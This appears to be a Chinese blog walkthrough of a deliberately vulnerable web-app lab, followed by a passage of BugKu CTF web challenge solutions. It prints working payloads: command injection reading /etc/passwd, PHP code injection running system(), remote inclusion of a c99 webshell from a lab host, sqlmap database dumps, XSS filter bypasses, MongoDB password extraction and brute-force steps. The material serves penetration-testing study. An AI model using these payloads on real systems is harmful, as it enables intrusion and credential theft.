结果很明显，我们可以利用LDAP注入攻击，在username参数动手脚实施登录绕过。（1）根据之前的则式结果，可以推断出过器的可能构造：(&amp;(cn=[IMPUT1])(userPassword=HASH[INPUT2]))2)这里哈希不是加盐的哈希(可能是加5或者SHA1）。LDAP支持用如下格式对密码进行加密：’{ICLEARTEXT}’，’{MD5}’，’{SMD5}’（加盐加5），’{SHA1}’，’{SSHA}’（加盐加5）和’{CRYPT}’等来保存密码。3）由于输入值2是被哈希过的，所以我们不能在这里进行注入。我们这里的目标就是向[input1]注入(用户名参数）。我们需要注意：1.当前的过滤末尾使用hacker)2.恒等式(如(cn=+))3.使用有效语法4.使用空字符（%00）来避免尾部的过滤4）一旦你满足这几个条件，你应该就可以使用hacker帐户登录，任何密码均可。然后你就能使用通配符来找到其它的用户了。举个例子，你可以在过滤器第一部分使用a*，然后检查你自己是作为什么身份登陆的。5）在大多数案例中，LDAP注入仅仅能帮助你绕过验证和加权认证，但想要检索任意数据很多时候都很困难或者根本不可能。 2.6 username使用空字符 2.7 username直接换成admin 将username直接换成admin，提示以admin身份登陆 （三）命令注入【原理】（1）命令注入攻击来自于缺少对被当作命令执行的输入部分进行有效的过滤或者编码。最简单的一个例子是利用system函数来执行，并且使用接收到的http参数作为有效输入变量 （2）许多方式可以执行命令注入攻击，如： 在反引号对中注入命令，比如‘id’ 把第一个命令的结果重定向到第二个中去，比如 | id 如果第一个命令被成功执行，可以尝试执行更多的命令：&amp;&amp; id（这里&amp;需要被编码） 在一个失败的命令后执行另一个命令：error || id（这里的error就只是为了制造一个错误） 这里也可以用相同值技巧来检测这种漏洞。比如，把123替换成‘echo123’。在反引号里面的代码会先被执行，但是返回的结果和没有更改过的返回的页面一样。 （4）你也可以用基于时间的载体来检则这种类型的漏洞。你可以引入需要服务器消耗时间来执行的命令来检则洞（可能会有造成拒绝服务攻击的风险）。你可以用sleep命令让服务器等待一段时间继续执行命令。比如用sleep 10 【步骤】一、Example1 1.1 源代码 简单的命令执行漏洞例子，开发者不做任何的输入验证，你可以直接在ip参数后注入你的命令 1.2 重定向 ?ip=127.0.0.1 | cat /etc/passwd 1.3 重定向2 可以将IP地址写错，然后把|改成|| ?ip=127.0.0 || cat /etc/passwd 二、Example2 2.1 源代码 添加了正则匹配的例子。在Example2中，开发者有经验提供的参数，但是用了不是很正确的方式。就像我们之前看到sql注入漏洞那样，利用的是多行的正则表达式。使用和在sql注入漏洞一样的技巧，你可以轻易地利用代码执行漏洞。这里比较方便的是你不在考虑注入分隔符，你只要注入编码的新代码（%0a），然后加上你要执行的命令 2.2 重定向 ?ip=127.0.0.1%0Acat /etc/passwd 三、Example3 3.1 源代码 没有正确的停止执行脚本例子。开发者没有正确的停止执行脚本。在PHP中，如果用户的提供的输入触发了某些安全规则的时候可以调用header函数非常简便的实现页面重定向。但是，就算浏览器会被重定向，这个函数并不会停止执行过程，脚本仍然会将危险的语句执行完毕。开发者需要在调用header面数后接着调用die通数未避免这个危险的错误 3.2 输入url 输入url，无法得到passwd文件的内容，且回到初始页面 ?ip=127.0.0.1%0Acat /etc/passwd 回车后回到初始页面 3.3 利用 curl 获取信息 打开cmd，输入： cd C:\\tools\\curl 再输入： curl &quot;...?ip=127.0.0.10xacat0x20/etc/passwd&quot; （四）代码注入【原理】（1）代码执行漏洞是因为对用户控制的输入数据没有进行恰当的过滤和转义。当你执行一个代码注入漏洞，你要在发送给web应用程序的数据中添加你的注入代码。比如，你想要执行ls命令，你要发送system(“l”)，因为这是个php程序（2）就像其他web漏洞的例子一样，通常很难知道怎么注释掉剩下的代码（比如程序在用户控制的数据后添加的代码）。在PHP中，你可以用//来绕过被添加的代码和SQL注入漏洞一样，你可以用同样的技巧来测试并且确保你的注入代码被执行： 用注释符来执行注入 用一个简单连接符”.”来注入（这里”用来打断语句并且正确的重组语句） 用字符串连接符来构造变量，比如用”.”ha”.”cker”来替代hacker （3）你还可以用基于时间的检测方式来定位漏洞，要用到php的sleep函数。下面两个例子也有不同的时间相应： 不使用sleep函数或者用零时间延迟函数：sleep(0) 用时间函数引入较长的延时：sleep(10) 【步骤】一、Example1 1.1 源代码 简单的例子，代码中使用了函数eval()，这是一个相当简单的代码注入例子 1.2 输入代码 ?name=hacker&quot;;phpinfo();&quot; 二、Example2 2.1 源代码 代码中使用了usort()函数和create_function()函数。在给某些信息排序的时候，开发者通常用两种方式，一是通过SQL请求来排序，二是利用PHP的usort函数。usort()函数通常和create_function()函数一起使用，用来根据用户控制的输入信息来动态的产生排序函数。如果web应用程序缺少严格的过滤和检验就可能导致代码执行漏洞的产生 2.2 输入url ?order=phpinfo() 报错 2.3 更改url ?order=phpinfo();// 还是报错 2.4 更改url ?order=id);phpinfo();// 还是报错 2.5 更改url ?order=id)};phpinfo();// 还是报错 2.6 更改url，成功得到PHP信息 ?order=id);}phpinfo();// 2.7 获取目标系统信息 ?order=id);};system(&#39;uname -a&#39;);// 三、Example 3 3.1 源代码 代码中使用了preg_replace()函数。在PHP中有一个非常危险的修饰符：preg_replace_eval()函数，这个修饰符会导致在执行替换之前preg_replace函数把新值当做PHP代码来执行（preg_replace_eval()函数在PHP5.0开始被剔除） 3.2 由URL可知用的应该是正则表达式 3.3 我们知道PHP很大部分关于code injection的漏洞都来自对于PCRE(Perl Compatible Regular Expression)的使用不当。PCRE被用于使用正则表达式，如preg_match和preg_replace。正常情况下，它是安全的，不过当在正则表达式后使用/e时，它允许PHP function添加一个callback ?new=phpinfo()&amp;pattern=/lamer/e&amp;base=... 3.4还可以使用system()函数执行任意命令，查看passwd系统文件或者ls命令 ?new=system(&#39;pwd&#39;)&amp;pattern=/lamer/e&amp;base=... ?new=system(&#39;ls&#39;)&amp;pattern=/lamer/e&amp;base=... 四、Example 4 4.1 源代码 4.2 报错信息 在URL后面添加一个单引号，从报错信息可知代码中使用了assert()函数 4.3 ?name=hacker&#39;.phpinfo().&#39; （五）文件包含【原理】（1）在很多web应用中，开发者需要在多重页面中通过包含文件来载入基础类或者共享一些模板 （2）文件包含漏洞是因为在用户控制的变量作为文件名的一部分被传入文件包含函数（PHP中有require、require_once、include or include_once等函数）时没有进行严格的过滤。一旦文件传入的方式存在漏洞，攻击者就可能操纵函数加载自己的代码。文件包含漏洞也可以被用来遍历读取任意文件。但是，如果有任意的代码包含开放的PHP标签，这个文件会被作为PHP代码来执行 （3）文件包含函数可以允许载入本地资源或者远程资源（比如一个web网站）。如果漏洞存在，他将导致： （4）本地文件包含：简称LFI，可以读取和执行本地文件 （5）远程文件包含：简称RFI，可以获取和执行远程文件 （6）默认情况下，PHP禁止载入远程文件，关联的配置选项是allow_url_included。在ISO中，这个选项被设置为允许能让你测试RFI漏洞 【步骤】一、Example 1 1.1 源代码 1.2 输入代码 在URL后随便添加一个特殊字符（比如单引号），会返回一个错误消息，由错误消息可以准确得到几条信息 一是这个脚本的路径是/var/www/fileincl/example1.php，二是这个函数用了include()，三是include()函数包含的文件是intro.php，且没有多余的东西或有过滤机制 1.3 获取passwd ?page=../../../../etc/passwd 1.4 远程包含 ?page=http://192.168.1.11/c99.txt 远程包含c99.txt，此时就直接拿到webshell，可以对网站进行一系列渗透操作 二、Example 2 2.1 源代码 由源代码可以看出来，代码中限制了包含的文件后缀为.php。这个例子中，php程序会在提供的文件值添加自己的后缀，也和先前的处理方法雷士，你可以在LFI中用NULL类型值来摆脱后缀带来的困扰。针对RFI，你还可以通过添加&amp;blah= 或者?blah= 绕过后缀问题，这要取决于你遇到的URL形式。在这个示例中，代码模拟的是旧版本的PHP行为。新版本（5.3.4开始）已经纠正了路径处理问题，并且不会受NULL类型值的影响 2.2 输入代码 ?page=../../../../etc/passwd 在本例中想再次获取passwd代码时，已经出错了，可以看到添加了后缀.php 2.3 %00 ?page=../../../../etc/passwd%00 2.4 远程包含 ?pagee=http://192.168.1.111/c99.txt%00 （六）目录遍历【原理】（1）目录遍历漏洞是因为web应用对路径部分没有过滤或者编码。在一个遍历漏洞中，可以使用”相同值技术”来测试是否存在问题。举个例子，如果一个参数的路径是/images/photo.jpg。你可以尝试以下这个路径： /images/./photo.jpg 可以看到同样的页面 /images/../photo.jpg 看懂一个错误页面 /images/../images/photo.jpg 再次看到同样的页面 /images/../IMAGES/photo.jpg 出现一个一个错误（视文件系统而定）或者发生一些古怪的事情 （2）如果没看到image这个路径参数，这个合法的路径直接是photo.jpg，你需要找出它的父目录是什么 （3）在测试中，你可以尝试检索其他文件。在Linux/Unix中最常用的测试文件是/etc/passwd。你可以这样尝试： images/../../../../../../../../../../../../etc/passwd （4）如果你能看到passwd文件的内容，说明web应用是存在漏洞的。这个方法的好处是你不用知道需要放几个../，如果你放了很多一样能奏效 （5）另一件有趣的事情是，如果在windows下你有个目录遍历漏洞，你可以打开test/../../../file.txt这样的路径，即使test这个目录不存在。但在linux就行不通。当遇到代码结合用户输入的数据来创建文件名的时候这是很有用的漏洞。举个例子，下面的php代码时设计为添加id变量来创建文件名的（比如example1.txt）。在Linux下，如果不存在以example_开头的目录，就无法利用这个漏洞，然而在windows下，即使不存在这样的目录，也能成功利用这个漏洞 $file = &quot;/var/files/example_&quot;.$_GET[&#39;id&#39;]&quot;.&quot;txt&quot;； 【步骤】一、Example 1 1.1 源代码 1.2 输入代码 ?file=../../../../../../etc/passwd 查看源代码 二、Example 2 2.1 源代码 这个代码加上了简单的路径检查，直接输入路径是看不到东西，但是可以绕过去 2.2 输入代码 ?file=../../../../../etc/passwd 返回一片空白 2.3 修改绕过 ?file=/var/www/files/../../../../../etc/passwd 三、Example 3 3.1 源代码 在这个代码中，当你尝试遍历目录时，服务端代码会在你的代码后面添加自己的后缀。这时候用NULL字符（url编码为%00）很容易绕过去。用空值摆脱服务器端添加的后缀通常是绕过方法，这在perl和旧版本的PHP能达到很好的效果。PHP从5.3.4开始解决了这个安全漏洞 3.2 输入代码 ?file=../../../../../etc/passwd 同样得不到任何东西 3.3 修改一下 ?file=../../../../../etc/passwd%00 （七）SQL注入【原理】（1）SQL注入是最常见的web漏洞之一。这里所有的SQL注入漏洞练习都是用Mysql当做数据库。SQL注入是由于程序做SQL查询的时候缺乏编码或者转义用户的输入造成的。由于SQL查询语句信息添加方式不同，需要用不同的语句来完成SQL注入，如使用引号（单引号或者双引号）、用反引号，以及直接添加值 （2）通过9个SQL注入实例的练习，可以学到： SQL躲避filter的各种方法，如使用HTML Encode、/ /注释、正则表达式、order by等方法进行filter insert、update、delete statement的注入方式 Prepared Statement的防注入 【步骤】一、Example 1 1.1 源代码 1.2 环境内容 可以看到参数是一个字符串root，并且看到表中有一行数据 1.3 尝试 在不知道服务器端代码的情况下，为了了解，我们随便输入一些参数进行测试 （1）在root参数后面添加一些多余的字符，结果返回的表中没有任何数据，可以猜测服务器端用到了我们提交的数据，并且对数据做了某些匹配，因为没有匹配的数据，所有没有数据返回 ?name=root123 （2）在root后面添加空格，却可以返回数据，因为Mysql默认情况下作比较操作的时候会忽略掉空格（+号代表空格） ?name=root+++ （3）添加双引号，同样没有数据返回 ?name=root&quot; （4）添加单引号时，整个表格直接是消失了，说明我们可能破坏了一些东西。由测试，我们可以推断出SQL查询语句有可能是这样的： SELECT * FROM users WHERE name=&#39;[INPUT]&#39;; 1.4 对猜测结果测试 （1）加上#号（url编码为%23），原先的查询语句中单引号会被#号注释掉 ?name=root&#39;%23 （2）加上and 1=1，得到和root一样的数据 ?name=root&#39; and 1=1 %23 （3）加上and 1=2，没有数据可以放回 ?name=root&#39; and 1=2 1.5 利用注入点进行注入 既然上面的猜测成立了，那么我们就可以利用注入点进行SQL注入 （1）利用sqlmap。注意：命令行中切换到sqlmap的目录下在执行以下命令 sqlmap.py -u &quot;http://...?name=root&quot; 这条命令可以获得目标操作系统的：操作系统版本、服务器使用的PHP和Apache版本、数据库版本 （2）查看拥有的数据库 sqlmap.py -u &quot;http://...?name=root&quot; --dbs 可以获得目标所拥有的所有数据库。ps：因为information_schema是默认存在的，所以我们可以确定当前使用的数据库就是另外一个：exercises，不用再通过–current-db来获取当前数据库 （3）获取某个数据库拥有的表 sqlmap.py -u &quot;http://...?name=root&quot; --tables -D &quot;exercises&quot; 从结果可以看出来，数据库中只有一个users表 （4）获取某个表的所有字段 sqlmap.py -u &quot;http://...?name=root&quot; --columns -D &quot;exercises&quot; 因为只有一张表，所有可以直接不用-T来指定哪个表，不然要使用-T （5）获取某个字段的指定内容 sqlmap.py -u &quot;http://...?name=root&quot; --dump -C &quot;name.passwd&quot; -D &quot;exercises&quot; 使用–dump获取由-C执行的字段值，结果得到5个账号的用户名和密码 二、Example 2 2.1 源代码 这个源代码中添加了对空格的过滤，并会报错：”ERROER NO SPACE” 2.2 输入代码 ?name=root&#39; and 1=1 %23 此时就报错了 2.3 空格的绕过方法 Mysql SQL注入绕过空格过滤的方法有几种方法： ① 对水平制表tab(HT或者\\t)进行url编码，即用%09代替空格 ② 使用注释绕过空格，即使用/**/代替空格 ③ 使用括号绕过空格 （1）使用%09代替空格 （2）and%091=2时，不返回数据 （3）使用/**/代替空格 2.4 找到注入点后就可以注入 ?name=root&#39;/**/union/**/select/**/*/**/from/**/users%23 三、Example 3 3.1 源代码 3.2 \\s过滤掉了空格和tab符号 \\s过滤了空格和tab符号，所以不能用%09代替空格了，否者会报错 3.3 但是还是可以使用/**/代替空格 四、Example 4 4.1 源代码 源码可以看出，代码中使用了mysql_real_escape_string()函数过滤了string，但是也仅仅只过滤了string 4.2 mysql_real_escape_string()函数 mysql_real_escape_string()函数转义SQL语句中使用的字符串中的特殊字符。受影响的字符包括： \\x00、\\n、\\r、\\、&#39;、&quot;和\\x1a 如果成功，则该函数返回被转义的字符串。如果失败，则返回false函数原型为mysql_real_escape_string(string,connection) 4.3 ?id=2 and 1=1 4.4 ?id=2 and 1=2 4.5 数值型注入 由4.3和4.4的测试知道，此SQL注入属于数值型的输入。由于过滤了单引号等， 对数值型注入其实没有意义，可以直接注入 ?id=2 union select * from users 五、Example 5 5.1 源代码 可以看出，代码中使用了一个正则表达式来预防SQL注入，不过，这个正则表达式没有用对，因为代码只确保了id参数是以一个数字开头，即只要首字母为数字，则能避过正则表达式的过滤 5.2 ?id=2 and 1=1 5.3 ?id=2 and 1=2 5.4 ?id=2 union select user(),2,3,4,5 %23 六、Example 6 6.1 源代码 这个正则表达式也没有用对，因为代码只确保了id参数是以一个数字结尾，不能确保id参数的开头是合法的，即只要尾字母为数字，则能避过正则表达式的过滤 6.2 6.3 6.4 七、Example 7 7.1 源代码 代码只确保了id参数都以一个数字开头和结尾。但是代码中的正则表达式中有一个修饰符/m，这个符号就是说在几行数据中如果有一行符合正则表达式，那么这行就被匹配到了。所以可以考虑使用换行符，\\n的URL编码为%0a 7.2 报错 ?id=2 and 1=1 7.3 利用%0a ?id=2%0aand 1=1 7.4 ?id=2%0aand 1=2 7.5 ?id=2%0aunion select user(),2,3,4,5 %23 八、Example 8 8.1 源代码 使用了mysql_real_escape_string()函数对参数进行过滤 8.2 8.3 有两种方法可以在Order by语句后面加一个值，一是直接加，如Order by name；二是在反引号中加，如Order by name。反引号`的作用是可以使用mysql预留的Keyword。Order by语句后面接的值不能在单引号’和或者双引号“中。 （1） ?order=name`%23 （2）ASC表示升序 （3）DESC表示降序 8.4 还可以利用别的方式来达到这个目的，如可以直接发送注入请求不用反引号。我们还可以用Mysql if语句来构造更多的攻击语句 ?order=name`,if(1=1,1,(select table_name from information_schema.tables));%23 此时执行的SQL语句是： select * from users order by `name`,if(1=1,1,(select table_name from information_schema.tables));#` 得到的参数为name时相同的结果 九、Example 9 9.1 源代码 代码中去掉了反引号`的限制 。上一个例子的payload值仍然可以使用，只不过需要去掉name后面的反引号 （八）XSS攻击【原理】（1）跨站脚本（XSS）的产生是由于信息被发送到用户的时候没有被正确编码。XSS可以被用来注入任意的HTML和JavaScript代码，结果就是XSS的payload运行在合法用户的浏览器中。和其他类型的攻击不同的是，XSS是针对用户，而不是直接针对服务器 （2）XSS大概的流程一般是：注入一个虚假的登录框；接受合法用户的cookies；注入浏览器；让用户在web应用中执行代码 （3）有三种类型的XSS： 反射型：payload直接在响应中出现 存储型：响应也会直接在响应中，但是更重要的是，当返回原页面或访问其他的页面的时候，payload还是会出现在响应中。这是因为payload被存在了应用程序的数据库中。典型的例子就是留言板中插入XSS DOM型：payload不会在响应中出现，但是当浏览器渲染页面的时候，payload就会被执行 （4）测试XSS的时候，应该赌侠返回的HTML代码，不能坐等alert窗口弹出来。检查哪些字符被编码了，而那些字符没有被编码。由此可能发现一个能工作的payload （5）一些浏览器有一些自带的保护措施在一定程度上可以用来抵抗XSS。这个抵抗功能可以被服务器禁用或者开启。如果发现payload在返回页面中出现了，但是并没有执行，那就有可能是这个抵抗功能发生作用了。这时可以关闭这种保护功能【步骤】 一、Example 1 1.1 源代码 没有对payload有任何的过滤或者编码 1.2 payload默认为hacker 1.3 因为没有任何过滤或者编码，所以直接进行XSS攻击 ?name=&lt;script&gt;alert(&#39;simpleware&#39;);&lt;/script&gt; 弹出simpleware 二、Example 2 2.1 源代码 2.2 preg_replace()函数进行过滤，所以上面的payload会以名字返回，而不是弹框 2.3 因为只对小写进行过滤，我们就可以用大写（首字母）进行绕过 ?name=&lt;Script&gt;alert(&#39;simpleware&#39;)&lt;/Script&gt; 三、Example 3 3.1 源代码 比Example2的源代码多了一个i，表示对前面的正则表达式区分大小写 3.2 此时若还是使用之前的首字母大写payload，会以名字形式返回 3.3 嵌套的script标签绕过过滤 ?name=Penterter&lt;script&gt;Lab 输出PenterterLab，说明使用嵌套的script标签绕过过滤是可行的 3.4 双写绕过 因为只用了一次preg_replace()，其实也就是双写 ?name=&lt;scr&lt;script&gt;ipt&gt;alert(&#39;simpleware&#39;)&lt;/scr&lt;script&gt;ipt&gt; 四、Example 4 4.1 源代码 条件判断，只要包含大小写的script就会一直报错 4.2 preg_match()和preg_match_all() preg_match()函数匹配成功一次后就会停止匹配 如果要实现全部结果的匹配，则需要使用preg_match_all()函数 4.3 使用之前的双写payload，会报错 4.4 使用img标签绕过 注意：因为onerror使用了单引号，alert()函数内要使用双引号，否则会异常 ?name=&lt;img src=&#39;xipu&#39; onerror=&#39;alert(&quot;simple&quot;)&#39; /&gt; 4.5 常见的让Javascript绕过过滤的方法： （1）&lt;a标签中有下面的这些事件：onmouseover（你需要把鼠标放到链接上才能触发payload），onmouseout，onmousermove，onclick…. （2）&lt;a标签中直接出现在URL中：&lt;a href=”javascript:alert(1)”…（你需要点击链接才能触发JavaScript代码，但是由于在这个例子中不能用script这个单词，所以这个方法在这个例子中实际上不能工作 （3）&lt;img标签中onerror事件onerror：&lt;img src=’zzzz’ onerror=’alert(1)’ /》 （4）&lt;div标签中有下面的事件：onmouseover（你需要把鼠标放在那个连接上才能触发payload），onmouseout，onmousemove，onclick… 五、Example 5 5.1 源代码 这次对alert大小写都进行了过滤 5.2 再次使用img标签就会报错 5.3 alert的替换方法 因为源码检测到有alert，会报错并停止，所以不能再使用alert()函数。此时有两种方法： 一是使用JavaScript中的eval和String.fromCharCode()，String.fromCharCode()函数会将一个整数编码到对应的字符中。用这个小技巧和ascii码表，可以轻易地产生字符串alert并且调用eval()函数执行它 二是使用JavaScript代码中的prompt、userprompt或者confirm函数，这两个函数比较少见，但是可以产生相同的效果 5.4 使用String.fromCharCode()函数 String.fromCharCode(97,108,101,114,116)相当于alert ?name=&lt;script&gt;eval(String.fromCharCode(97,108,101,114,116))(&#39;simpleware&#39;)&lt;/script&gt; 5.5 String.fromCharCode()函数可接受一个指定的Unicode值，然后返回一个字符串 5.6 使用prompt()函数 ?name=&lt;script&gt;prompt(&#39;simpleware&#39;)&lt;/script&gt; 5.7 prompt()函数 用于显示一个带有提示信息，并且用户可输入信息的对话框 六、Example 6 6.1 源代码 此代码中，发送的payload是在Javascript代码中执行的。为了实现XSS攻击，现在payload中不需要script标签了，只需要注入已完成前面的已经存在的JS代码和添加自己的payload，然后在注入点处把后面的代码用//都注释掉或者添加一些多余的代码（var $dummy=”）来把后面的代码正确关闭掉。因为直接在js环境中输出php变量，所以可以考虑通过构造js脚本进行过滤 6.2 构造payload ?name=xipu&quot;;alert(&#39;simpleware&#39;)// 七、Example 7 7.1 源代码 与上一个例子类似，只是多使用了一个函数htmlentities()对payloads进行了html编码。因为在js环境中输出通过html编码的php变量，而htmlentities没有过滤单引号，所以可以考虑使用单引号进行绕过 7.2 构造payload ?name=xipu&#39;;alert(&#39;simpleware&#39;)// 八、Example 8 8.1 源代码 有源码可以知道，payload都已经被合适地编码过了。不过，页面中还是存在一个XSS，为了构成表单，程序开发者使用了PHP_SELF，这个变量是受用户控制的，由于POST地址使用了当前URL，可以考虑构造当前URL地址达到XSS目的 8.2 构造payload /&quot;method=&quot;POST&quot;&gt;&lt;script&gt;alert(&#39;simple&#39;)&lt;/script&gt; 九、Example 9 9.1 源代码 由源码可以看出，这个例子是一个基于DOM的XSS。这个实际上是个静态网页，不过依然存在漏洞。在这个例子中，可知当前页面渲染的时候，Javascript代码用URL得到锚点（URL中#后面这一部分），并且在客户端动态地写入页面。如果使用payload当做URL的一部分，这个可以用来触发XSS漏洞。因为直接在页面输出锚点id，所以考虑构建一个带XSS的锚点到达XSS目的 9.2 document.write()函数用于向文档写入HTML表达式或Javascript代码，将其多个参数（exp1,exp2,exp3,….）按顺序被追加到文档中。函数原型为document.write(exp1,exp2,exp3,….)。location.hash就是得到URL中从#开始的字符串。substring(1)就是得到#后的字符串 9.3 构造Payload #&lt;script&gt;alert(&#39;simpleware&#39;)&lt;/script&gt; 发现XSS攻击没有成功，因为&lt;、&gt;和单引号被URL编码了 （九）MongoDB【原理】（1）MongoDB是一个基于分布式文件存储的数据库。由C++语言编写。旨在为WEB应用提供可拓展的高性能数据存储解决方案 （2）MongoDB是一个介于关系数据库和非关系数据库之间的产品，是非关系数据库当中功能最丰富的、最像关系数据库的。它支持的数据结构非常松散，是类似json的bson格式，因此可以存储比较复杂的数据类型。MoongoDB最大的特点是它支持的查询语言非常强大，其语法有点类似于面向对象的查询语言，几乎可以实现类似关系数据库单表查询的绝大部分功能，而且还支持对数据建立索引 【步骤】一、Example 1 1.1 一个登陆界面。依据以往常用的知识，我们经常使用两种方法来绕过登陆，一是构造总是真实的条件，二是正确地终止SQL查询。通过阅读一些MongoDB文档，我们知道，在MongoDB中，or 1=1会被翻译为 || 1==1，可使用//或者&lt;!-来终止查询。在Username处输入’ || 1=1 //，提交 1.2 登陆成功 二、Example 2 2.1 看到两个用户名 2.2 单击其中一个用户，只得到一个用户的界面 2.3 构造一些语句来推断admin的密码 ?search=admin&#39; &amp;&amp; this.password.match(/./)// 经过部分url编码后： ?search=admin&#39;%20%26%26%20this.password.match(/./)//+%00 得到同样的结果，因为点.匹配除”\\r \\n”之外的任何单个字符 2.4 输入以下内容却无结果，说明猜测的密码zzzzz并不正确 ?search=admin&#39;%20%26%26%20this.password.match(/zzzzz/)//+%00 2.5 输入以下内容报错 ?search=admin&#39;%20%26%26%20this.passwordzz.match(/zzzzz/)//+%00 2.6 通过前面的实验，我们可以得到一个结论：当admin的密码匹配我们构造的正则表达式时，我们可以得到正确的结果，而不匹配的话则无结果。根据这个我们就可以进行猜测admin的密码了 2.7 在开始猜测admin的密码前，我们先介绍一点正则匹配的知识。^匹配输入字符串的开始位置。点.匹配除”\\r \\n”之外的任何单个字符。*匹配前面的子表达式任意次。$匹配输入字符串的结束位置。下面我们可以举例说明一下。我们假设密码为aab时，使用下面的正则表达式进行匹配，匹配结果分别为： /^a.*$/ 匹配 /^a$/ 不匹配 /^aa.*$/ 匹配 /^aa$/ 不匹配 /^aaa.*$/ 不匹配 /^aab.*$/ 匹配 /^aab$/ 匹配，密码找到 2.8 根据这个，我们可以编写脚本来破解admin的密码，还可以使用工具Burpsuite进行爆破 （十）Authorization【原理】（1）授权问题在Web应用程序中是非常常见的。本实验的练习汇集了一下常见的漏洞的例子。现代的web开发框架往往保护各种注入，但不能自动顾及这类问题的自动，因为他们无法理解其背后的商业逻辑。授权问题不能真正由自动web扫描仪进行测试，因为同样的原因，这就是为什么它往往是一个很好的漏洞来源，重要的是要知道如何测试它们。下面的部分“量分配”也是一个授权问题 【步骤】一、Example 1 1.1 登陆 1.2 看到两条信息 1.3 分别查看两条信息，并且把URL地址记录下来 分别是： http://vulnerable/authorization/example1/infos/1 http://vulnerable/authorization/example1/infos/2 发现除了最后的数字是递增的，其他都一样 1.4 点击Logout退出登录 退出登陆后，在任意一个地方输入Confidential的URL，会发现直接访问Confidential的信息，不需要在经过用户名密码登录 二、Example 2 2.1 同样的用提供的账号密码登录，看到两条信息 2.2 分别点击两个信息，观察URL，按照递增输入3，进入user2的内容 2.3 继续递增到4也可以看到新的内容 三、Example 3 3.1 同样的用提供的账号密码登录，看到两条信息 3.2 分别点击2条信息，其URL还是递增的，但是已经无法修改而访问，但是多了”Edit this info”，点击得到如下页面 3.3 修改URL数字1为2，直接访问user1(2)的编辑信息界面 3.4 修改为3，跳转到user2的内容编辑页面 （十一）Captcha【原理】（1）关于captcha的验证，有各种各样的captcha bypass方式 【步骤】一、Example 1 1.1 验证码，想办法绕过 1.2 输入验证码，提交，使用Burpsuite拦截 1.3 直接删去captcha及其参数，得到响应吗 200，绕过成功 1.4 单击右键，选择”Request in browser” - “in original session” 1.5 单击”copy” 1.6 在浏览器粘贴刚才复制的网站，单击”Repeat request” 1.7 可以看到在浏览器完成我们操作的请求，返回”Success!!!” 二、Example 2 2.1 captcha参数换成answer，操作和Example1一样，不赘述 三、Example 3 3.1 多了一条cookie信息 发现Request信息中多了一条cookie信息，发现其值其实就是验证码的值，将URL中的captcha的值改为cookie的值，成功绕过captcha验证，登陆成功 四、Example 4 4.1 输入正确一次，就会有一个session 之后一直使用这个session就可以了 五、Example 5 5.1 枚举 发现验证码就那几个单词，可以通过枚举单词进行captcha验证 5.2 将图片保存下来，并把验证码写成文件名 5.3 编写Python代码，返回页面存在Success则说明登陆成功 六、Example 6 6.1 算术运算的验证码 6.2 直接匹配然后提交数据 6.3 看到Success说明成功 （十二）Authentication【原理】（1）身份认证bypass练习。Authentication即身份验证，在.NET Framework安全中，通过对照某些机构检查用户的凭据，发现和验证主体标识的过程 【步骤】一、Example 1 1.1 提示我们用户名是root，但是密码不知道，需要去猜测，试一下password 1.2 密码错误，再试一下密码admin 1.3 登陆成功，密码就是admin 二、Example 2 2.1 提示账号是hacker，密码无法猜测，只能去找 2.2 使用脚本进行猜测 2.3 解密过程如下 2.4 根据响应时间判断密码 由猜解过程中花费的时间可知猜解字母p时处理的时间最长，所以密码的首字母为p，猜解结果为25既字母p，提示选择某个字符，这里选择25既字母p继续进行猜解。同理得到第二个字母。。。最后密码是p4ssw0rd 2.5 用猜测的密码进行登录 2.6 登陆成功 三、Example 5 3.1 注册业务逻辑漏洞 除了登陆之外，还有注册功能，猜测是业务逻辑漏洞，注册的时候没有做大小写判断，产生了注册覆盖，那么注册一个Admin就可以进行登陆了 3.2 注册用户Admin，密码123456，提交 3.3 成功注册并且以admin用户登陆 四、Example 4 4.1 同样有注册功能，mysql会忽略掉随在字符串后面的空格，利用这个注册覆盖 4.2 注册时，admin后面有空格 4.3 成功注册并且以admin身份登陆","categories":[],"tags":[{"name":"基础知识点","slug":"基础知识点","permalink":"https://knlvre.github.io/tags/基础知识点/"}],"author":"Knlvre"},{"title":"BugKuCTF — Web题(第11-20关)","slug":"BugKuCTF—Web题 第11-20关","date":"2019-03-07T16:00:00.000Z","updated":"2019-09-01T06:22:41.429Z","comments":true,"path":"2019/03/08/BugKuCTF—Web题 第11-20关/","link":"","permalink":"https://knlvre.github.io/2019/03/08/BugKuCTF—Web题 第11-20关/","excerpt":"","text":"前一部分链接：第1-10关Write-up 第十一关（web5）链接打开看到提示 查看网页的源代码看到一大堆中括号、感叹号、加号组成的字符串 将这串符号放到控制台 — Console里面，直接回车，就得到了flag 第十二关（头等舱）链接打开看到”什么也没有。”，查看源代码也是什么都没有 但是用Burpsuit抓下来，发送GET请求看一下， 在返回的头中就有flag 第十三关（网站被黑）链接进去后，看到被黑的网页 首先选择使用御剑扫描一下后台，结果是扫到shell.php 访问一下，尝试几个常见的密码不行后，直接放到Burpsuit进行爆破 选择Burpsuit自带的密码字典：Intruder — Payloads — Add from lists — password 爆破出来密码是hack 将hack输入后，得到了flag 第十四关（系统管理员）链接进去后，看到可以输入用户名和密码的输入框 随便输入一个用户名和密码尝试登陆后，出现提示 先用Burpsuit抓下来，由于提示的是”请联系本地管理员登陆”，首先想到的是x-forwarded-for 所以在POST请求头加上x-forwarded-for x-forwarded-for: 127.0.0.1 go发送之后，返回的内容多了一行信息，但是就是没有flag 折腾了好久，最后在返回的信息的最最最最最后，找到了一串base64加密的字符串（以后还是要注意一下细节） 最后拿去解密一下，拿到了flag 第十五关（web4）链接进去后，提示我们看一下源代码，看看就看看 源代码中看到比较关键的部分，并且有unescape()函数 我们就按照他的字符串拼接，去在线网站解密 自己创建文本，将解密后的东西写下来，是Javascrip 将67d709b2b54aa2aa648cf6e87a7114f1复制网页中，提交后，就得到了flag 第十六关（flag在index里）链接打开后只有”click me?no”的字样 他说不点就不点吗，那不就很没面子？我们点进去只看到写着test5，但是注意看url，通过GET方式传递file变量 直接试一下文件包含漏洞 但是使用show_source()和file()函数都返回一片空白 第三种文件包含方法就成功了，返回一串经过base64加密的字符串 简单的用Python解密一下，就可以看到index.php的源代码，里面有着flag 第十七关（输入密码查看flag）链接打开有一个可以输入密码的输入框 随意输入一个密码尝试一下会报错 既然题目的url提示着baopo，那么我们就用Burpsuit尝试着去爆破一下 因为题目提示”输入5位数密码”，所以我们设置从10000-99999之间的数，步数是1 可以明显看到结果出来了，是13579 输入密码后，直接给出了flag 